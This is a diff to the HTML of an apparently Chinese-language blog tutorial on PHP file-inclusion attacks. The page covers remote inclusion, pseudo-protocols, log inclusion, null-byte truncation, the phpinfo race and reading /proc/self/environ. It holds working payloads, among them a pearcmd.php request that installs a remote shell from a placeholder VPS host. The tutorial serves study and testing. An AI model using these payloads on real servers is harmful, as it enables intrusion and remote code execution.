@@ -40,8 +40,6 @@ requir"><meta name="keywords" content="Security, life"><meta content="width=devi
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename = http://192.168.59.1:8080/ws.php</span><br></pre></td></tr></table></figure>
 <br>
 
-<br>
-
 <h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file://     --访问本地文件系统</span><br><span class="line">http://     --访问http(s)网址</span><br><span class="line">ftp://      --访问FTP(s) URLs</span><br><span class="line">php://      --访问各个输入/输出流</span><br><span class="line">zlib://     --压缩流</span><br><span class="line">data://     --数据</span><br><span class="line">phar://     --PHP归档</span><br></pre></td></tr></table></figure>
 
 <h3 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h3><h4 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p><em>不受allow_url_fopen以及allow_url_include的影响</em></p>
@@ -103,9 +101,12 @@ requir"><meta name="keywords" content="Security, life"><meta content="width=devi
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?file=a.php</span><br></pre></td></tr></table></figure>
 
 <p>此外，还有其它的利用方式</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://[vps-ip]:[port]/test1.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?+install+--installroot+&amp;r=/usr/local/lib/php/pearcmd.php&amp;+http://[vps-ip]:[port]/test1.php</span><br></pre></td></tr></table></figure>
 
 <p>该 payload 会通过 <code>install</code> 远程下载 shell，在有回显的情况下，服务器会回显下载的目录</p>
+<blockquote>
+<p><strong>注意：</strong> docker环境搭建的 PHP 可能路径不一样（可能在 <code>/usr/share/php/pearcmd.php</code>），可以通过本地搭建 PHP 环境寻找路径</p>
+</blockquote>
 <h2 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h2><p>如果 php 存在本地包含漏洞，但无法上传文件，也可以考虑包含日志文件获取 webshell，该方法需要开启服务器日志记录功能</p>
 <p>访问日志的位置和文件名在不同的系统上会有所差异</p>
 <ul>
@@ -139,8 +140,6 @@ requir"><meta name="keywords" content="Security, life"><meta content="width=devi
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=flag.txt%00</span><br></pre></td></tr></table></figure>
 <p>如果magic_quotes_gpc &#x3D; On 或者 使用addslashes函数，那么情况便会变为下面</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file=hello.txt%00</span><br><span class="line"></span><br><span class="line"># 结果为</span><br><span class="line">hello.txt\0.php</span><br></pre></td></tr></table></figure>
-
-<br>
 
 <h3 id="file-get-contents-函数——例题"><a href="#file-get-contents-函数——例题" class="headerlink" title="file_get_contents 函数——例题"></a>file_get_contents 函数——例题</h3><ul>
 <li>该函数是用于把文件的内容读入到一个字符串中</li>
@@ -211,6 +210,7 @@ requir"><meta name="keywords" content="Security, life"><meta content="width=devi
 <p>所以这个利用的<strong>条件</strong>就是，需要有一个地方能获取到文件名，例如 phpinfo。<strong>phpinfo 页面</strong>中会输出这次请求的所有信息，包括 <code>$_FILES</code> 变量的值，其中包含完整文件名</p>
 <p>然后利用条件竞争，用两个以上的线程来利用，其中一个发送上传包给 phpinfo 页面，并读取返回结果，找到临时文件名；第二个线程拿到这个文件名后马上进行包含利用</p>
 <p>exp：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py">exp.py</a></p>
+<h3 id="利用-x2F-proc-x2F-self-x2F-environ"><a href="#利用-x2F-proc-x2F-self-x2F-environ" class="headerlink" title="利用 &#x2F;proc&#x2F;self&#x2F;environ"></a>利用 &#x2F;proc&#x2F;self&#x2F;environ</h3><p>在 Linux 系统中，&#x2F;proc&#x2F;self&#x2F;environ 存储了当前进程的环境变量，可以尝试读取这些敏感数据</p>
 <h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
 <li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHP 裸文件本地包含综述</a></li>
 </ol>
